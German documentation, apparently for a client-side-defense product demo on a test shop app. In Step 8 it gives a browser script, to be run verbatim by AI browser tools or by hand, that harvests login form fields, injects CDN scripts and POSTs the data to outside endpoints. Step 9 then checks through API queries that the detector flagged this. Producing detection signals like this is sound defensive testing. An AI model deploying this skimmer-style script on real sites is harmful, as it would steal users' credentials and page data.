Phase 2 erzeugt simulierten Angriffsverkehr gegen die geschützte Anwendung und bestätigt, dass CSD diesen erkannt hat. Phase 1 muss abgeschlossen sein — alle Prüfungen aus Schritt 7 müssen BESTANDEN sein — bevor Sie fortfahren.

## Schritt 8: Angriffssimulation

<Aside type="note">
Dieser Schritt erfordert browserseitige JavaScript-Ausführung — `curl` kann keine CSD-Erkennung auslösen. KI-Assistenten mit Browser-Automatisierungstools (MCP Chrome DevTools, Playwright, Puppeteer) führen diese Schritte direkt über die unten beschriebene **KI-automatisierte Ausführung** aus. Operatoren ohne Browser-Automatisierung führen die manuellen Schritte durch.
</Aside>

Nachdem die Infrastruktur verifiziert wurde (alle Prüfungen aus Phase 1 Schritt 7 BESTANDEN), führen Sie die Angriffssimulationsskripte aus, um CSD-Erkennungen zu erzeugen. Die Skripte sind im Leitfaden [Erkennung auslösen](/csd/trigger-detection/) und in der [Angriffsskript-Bibliothek](/csd/attack-scripts/) definiert.

### KI-automatisierte Ausführung

KI-Assistenten mit Browser-Automatisierungstools führen die Angriffssimulation programmatisch aus:

1. **Navigation mit initScript** — navigieren Sie zunächst zu `about:blank`, um einen sauberen Dokumentkontext sicherzustellen (vermeidet veraltete initScripts von vorherigen Navigationen), dann `navigate_page` zu `http://$F5XC_DOMAINNAME/#/login` mit einem `initScript`, das die nativen `setInterval`, `clearInterval`, `fetch` und `console.log` speichert, bevor zone.js sie patcht, auf die Login-Formularfelder pollt, Anmeldedaten über den nativen `HTMLInputElement.prototype.value`-Setter einträgt und sofort das Combined Detection Script inline ausführt. Verwenden Sie das unten stehende initScript wörtlich.
2. **Willkommensbanner schließen** — `press_key` mit `Escape`, um das Willkommensbanner zu schließen. Bei nachfolgenden Besuchen erscheint das Banner möglicherweise nicht (Cookies bleiben erhalten). Der Cookie-Einwilligungsdialog wird automatisch durch die Escape-Taste geschlossen.
3. **Auf Abschluss warten** — 10 Sekunden warten, bis alle CDN-Skript-Lade-/Fehler-Callbacks und Fetch-Promise-Auflösungen abgeschlossen sind.
4. **Beweise sichern** — `list_console_messages`, um auf `[CSD Demo] Simulation complete` und CDN-Ladeergebnisse zu prüfen; `list_network_requests` gefiltert nach `script`- und `fetch`-Typen, um HTTP-Statuscodes zu verifizieren (`200`/`201` für Erfolg, `pending` für gehaltene Anfragen).

**Phase 2 initScript (wörtlich — genau so verwenden wie geschrieben):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js-Inkompatibilität** — Juice Shop verwendet Angulars zone.js, das `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` und andere Browser-APIs patcht. Dies bricht die MCP-Tools `evaluate_script`, `fill` und `click` mit `Cannot read properties of undefined (reading 'call')`. Verwenden Sie stattdessen `navigate_page` mit `initScript` — `initScript` wird vor dem Laden von zone.js ausgeführt, sodass Sie native API-Referenzen speichern und in Polling-Callbacks verwenden können. Das initScript muss Formularfelder über den nativen `HTMLInputElement.prototype.value`-Setter füllen (nicht `fill`) und das Erkennungsskript inline ausführen (nicht über `setTimeout`, das zone.js nach dem Seitenaufbau abfangen kann). Siehe [Erkennung auslösen — KI-automatisierte Ausführung](/csd/trigger-detection/#ai-automated-execution) für Details.
</Aside>

<Aside type="note">
**initScript-Akkumulation** — jeder `navigate_page`-Aufruf mit einem `initScript`-Parameter fügt das Skript einer persistenten Liste hinzu, die bei jedem nachfolgenden Dokumentladen ausgeführt wird. Um zu vermeiden, dass veraltete Skripte stören, navigieren Sie entweder zwischen den Durchläufen zu `about:blank` oder verwenden Sie `new_page` mit `isolatedContext` für einen sauberen Browser-Kontext.
</Aside>

<Aside type="note">
**Speichern des nativen `fetch` im initScript** — das initScript speichert `window.fetch.bind(window)` bevor zone.js es patcht. Dies stellt sicher, dass Fetch-Aufrufe korrekt funktionieren, ohne zone.js `Cannot read properties of undefined`-Fehler. Dasselbe initScript (mit gespeichertem nativen `fetch`) wird sowohl für Phase 2 als auch für Phase 3 Angriffsdurchläufe verwendet — CSD-Mitigation fängt `fetch()`-Aufrufe nicht ab, daher beeinflusst das Speichern der nativen Referenz das Mitigationsverhalten nicht.
</Aside>

<Aside type="caution">
**Vorübergehender Origin-404** — bei der ersten Navigation zur Angular-Anwendung kann `polyfills.js` oder andere App-Skripte einen vorübergehenden HTTP 404 vom Origin-Server zurückgeben. Dies führt dazu, dass Angular das Bootstrapping nicht durchführen kann, was zu einer leeren Seite ohne Login-Formular führt. Der 404 ist kurzlebig — nachfolgende Anfragen geben 200 oder 304 zurück. **Wiederherstellung:** Navigieren Sie zu `about:blank`, warten Sie 2 Sekunden und versuchen Sie die Navigation erneut. Wenn das Problem über mehrere Versuche hinweg bestehen bleibt, überprüfen Sie die Origin-Gesundheit über den Load-Balancer-Pfad (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### Manuelle Ausführung

Operatoren ohne Browser-Automatisierungstools führen die Schritte manuell durch:

1. **Navigieren** Sie zur Login-Seite der geschützten Anwendung: `http://xF5XC_DOMAINNAMEx/#/login`
2. **Dummy-Anmeldedaten eingeben** — geben Sie `test@example.com` in das E-Mail-Feld und `P@ssword123` in das Passwort-Feld ein (senden Sie das Formular nicht ab)
3. **DevTools öffnen** — drücken Sie **F12** und wechseln Sie zum Tab **Konsole**
4. **Combined Detection Script ausführen** — fügen Sie das Skript aus [Erkennung auslösen &mdash; Combined Simulation Script ausführen](/csd/trigger-detection/#run-the-combined-simulation-script) in die Konsole ein und drücken Sie Enter
5. **Konsolenausgabe überprüfen** — bestätigen Sie, dass die `[CSD Demo]`-Phasenausgabe zeigt: Formularfeld-Harvesting, Skript-Injektion von 4 CDN-Domains und Datenexfiltration zu 2 Endpunkten

### Was ausgelöst wird

| Signal | Verhalten | Erkennung |
| --- | --- | --- |
| Formularfeld-Harvesting | Liest E-Mail- und Passwort-Eingabewerte | Skripte, die sensible Formularfelder lesen — als hohes Risiko eingestuft |
| Skript-Injektion | Injiziert 4 `&lt;script&gt;`-Tags von `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Bis zu 4 neue Drittanbieter-Skript-Domains erkannt (CDN-Verfügbarkeit variiert) |
| Datenexfiltration | Sendet gesammelte Daten via `fetch` an `www.httpbin.org` und `jsonplaceholder.typicode.com` | Netzwerkaufrufe zu externen Domains |

<Aside type="note">
**CDN-Verfügbarkeit variiert.** Nicht alle 4 CDN-Skripte werden bei jedem
Durchlauf geladen — Browser-Ressourcenlimits, Netzwerkbedingungen oder CDN-Drosselung
können dazu führen, dass einige mit `ERR_INSUFFICIENT_RESOURCES` fehlschlagen oder ein Timeout aufweisen.
Die Simulation ist erfolgreich, wenn **irgendein** CDN-Skript geladen wird. CSD erkennt den
Injektionsversuch unabhängig davon, ob das Skript erfolgreich geladen wird —
die Erstellung des `&lt;script&gt;`-Tags selbst ist das Erkennungssignal.

In schweren Fällen kann `ERR_INSUFFICIENT_RESOURCES` zu einem seitenweiten Fehler eskalieren — die gesamte Seite wird leer, Screenshots laufen ab und `take_snapshot` schlägt fehl. Dies tritt typischerweise auf, nachdem sich mehrere Navigationen mit umfangreichen initScripts im selben Browser-Kontext angesammelt haben. **Wiederherstellung:** Verwenden Sie `new_page` mit `isolatedContext`, um einen frischen Browser-Kontext zu erstellen, und wiederholen Sie dann die Sequenz `about:blank` → `navigate_page` mit initScript. Dies unterscheidet sich von einzelnen CDN-Skript-Fehlern, die den Simulationserfolg nicht beeinflussen.
</Aside>

<Aside type="tip">
Verwenden Sie nach dem Ausführen der Angriffssimulation diese deterministische Polling-Schleife, um auf Erkennungen zu warten:

1. Fragen Sie `/detected_domains` alle 60 Sekunden ab
2. Wenn DET-3 besteht (Exfil-Domains erscheinen in `/detected_domains`), fahren Sie sofort mit Schritt 9 fort
3. Wenn nach 10 Abfragen (10 Minuten) noch leer, überprüfen Sie den CSD-Status (Phase 1 Schritt 5) und die Registrierung der geschützten Domain (Phase 1 Schritt 6) — einer davon ist wahrscheinlich falsch konfiguriert
4. Wenn nach 30 Abfragen (30 Minuten) noch leer, stoppen und dem Operator melden — fahren Sie nicht mit Phase 3 fort

Für zusätzliche gezielte Simulationen (einzelne Angriffskategorien, maximaler Erkennungs-Stresstest) siehe die [Angriffsskript-Bibliothek](/csd/attack-scripts/).
</Aside>

### Beweise

Der KI-Assistent sollte Folgendes berichten. Bei KI-automatisierter Ausführung werden Beweise programmatisch über `list_console_messages` erfasst (die Polling-Funktion des initScript protokolliert Ergebnisse in der Konsole). Bei manueller Ausführung liest der Operator die Browser-Konsolenausgabe.

| Prüfung | Erwartet | Status |
| --- | --- | --- |
| Login-Seite geladen | `200 OK` bei `http://$F5XC_DOMAINNAME/#/login` | BESTANDEN / FEHLGESCHLAGEN |
| Konsolenskript ausgeführt | `[CSD Demo] Simulation complete` in der Konsolenausgabe | BESTANDEN / FEHLGESCHLAGEN |
| Felder gesammelt | Anzahl &gt; 0 in der Konsolenausgabe | BESTANDEN |
| Skripte injiziert | 1–4 CDN-Domains in der Konsolenausgabe (einige können mit Ressourcenfehlern fehlschlagen) | BESTANDEN wenn irgendeine CDN-Domain erscheint |
| Exfil-Kanäle | 2 Fetch-POST-Versuche in der Konsolenausgabe | BESTANDEN |

<Aside type="tip">
Wenn das HTTPS-LB-Zertifikat gültig ist (`CertificateValid`), können Sie die Simulation optional auch gegen `https://$F5XC_DOMAINNAME/#/login` ausführen. Dies ist für den Demo-Fortschritt nicht erforderlich.
</Aside>

## Schritt 9: Erkennungsverifizierung über API

Fragen Sie die CSD-API-Endpunkte ab, um zu bestätigen, dass Erkennungen erschienen sind. Verwenden Sie die Polling-Schleife: Fragen Sie `/detected_domains` alle 60 Sekunden ab; fahren Sie fort, sobald DET-3 besteht. Wenn DET-3 nach 10 Minuten nicht besteht, überprüfen Sie die CSD-Konfiguration. Wenn DET-3 nach 30 Minuten nicht besteht, stoppen und dem Operator melden. Diese Endpunkte sind in der [API-Referenz](/csd/api-reference/) dokumentiert und verwenden dieselbe Authentifizierung und denselben Namespace wie die vorherigen Schritte.

<Aside type="note">
**Endpunkt-Verarbeitungsreihenfolge:** `/detected_domains` wird zuerst befüllt und ist der primäre Indikator dafür, dass die CSD-Pipeline funktioniert. `/scripts` und `/formFields` werden nach einem langsameren Backend-Verarbeitungszeitplan befüllt und können selbst nach mehreren Simulationsläufen 20–30 Minuten lang leer bleiben. Wenn `/detected_domains` Exfil-Domains zeigt (`www.httpbin.org`, `jsonplaceholder.typicode.com`), betrachten Sie die Simulation als erfolgreich erkannt und fahren Sie fort — die DET-1-Prüfung unten spiegelt dies wider.
</Aside>

### Erkannte Skripte

Abfrage nach Skripten, die in den letzten 24 Stunden erkannt wurden:

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| Feld | Erwartet | Status |
| --- | --- | --- |
| `total` | &gt; 0 (Skripte erkannt) | BESTANDEN wenn &gt; 0; AUSSTEHEND wenn 0, aber `/detected_domains` Exfil-Domains zeigt |
| Skriptnamen | Enthält CDN-Domains (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) in `script_name` | BESTANDEN wenn injizierte CDN-Domains erscheinen |

### Erkannte Domains

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| Feld | Erwartet | Status |
| --- | --- | --- |
| `total_domains` | &gt; 0 | BESTANDEN wenn &gt; 0 |
| Domain-Liste | Enthält CDN- und Exfil-Domains | BESTANDEN wenn erwartete Domains erscheinen |

### Formularfelder

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Feld | Erwartet | Status |
| --- | --- | --- |
| `total` | &gt; 0 | BESTANDEN wenn &gt; 0; AUSSTEHEND wenn 0, aber DET-3 besteht |
| `name` | Enthält `email`, `password` | BESTANDEN wenn sensible Felder erscheinen |
| `sensitivity` | `Sensitive` für E-Mail-/Passwort-Felder | BESTANDEN wenn ML korrekt klassifiziert hat |

<Aside type="note">
**Die Verarbeitung von Formularfeldern ist langsamer als die Domain-Erkennung.** Der
`/formFields`-Endpunkt kann bei der ersten Abfrage Felder mit unvollständigen Metadaten
zurückgeben. Die ML-Sensitivitätsklassifizierung (`Sensitive` vs
`Not Sensitive`) wird nach Abschluss der Backend-Verarbeitung befüllt —
dies kann 20–30 Minuten nach dem ersten Simulationslauf dauern. Wenn
Felder angezeigt werden, aber keine Klassifizierung haben, fragen Sie später erneut ab. DET-3
(`/detected_domains`) ist das primäre Bestehens-Kriterium.
</Aside>

### Phase 2 Beweis-Zusammenfassung

Präsentieren Sie nach allen Erkennungsabfragen den endgültigen Erkennungsstatus:

| Test-ID | Prüfung | Status |
| --- | --- | --- |
| DET-1 | Skripte erkannt (`/scripts`-Endpunkt) | BESTANDEN wenn &gt; 0; AUSSTEHEND wenn leer, aber DET-3 besteht |
| DET-2 | CDN-Domains erkannt | BESTANDEN / FEHLGESCHLAGEN |
| DET-3 | Exfil-Domains erkannt (`/detected_domains`) | **Primärer Indikator** — BESTANDEN wenn `www.httpbin.org` oder `jsonplaceholder.typicode.com` erscheinen |
| DET-4 | Formularfelder erkannt (`/formFields`-Endpunkt) | BESTANDEN wenn &gt; 0; AUSSTEHEND wenn leer, aber DET-3 besteht |

<Aside type="note">
**Mindestkriterien zum Fortfahren mit Phase 3:** DET-3 muss BESTANDEN sein (Exfil-Domains sichtbar in `/detected_domains`). DET-1 und DET-4 können bei erstmaliger Nutzung oder nach einem frischen Rebuild AUSSTEHEND zeigen — dies ist normal. Wenn DET-3 nach 30 Minuten ebenfalls FEHLGESCHLAGEN zeigt, überprüfen Sie, ob CSD aktiviert ist (Phase 1 Schritt 5), die geschützte Domain registriert ist (Phase 1 Schritt 6) und das CSD-JS-Tag injiziert wird (Phase 1 Schritt 7 JS-Konfigurationsprüfung).
</Aside>
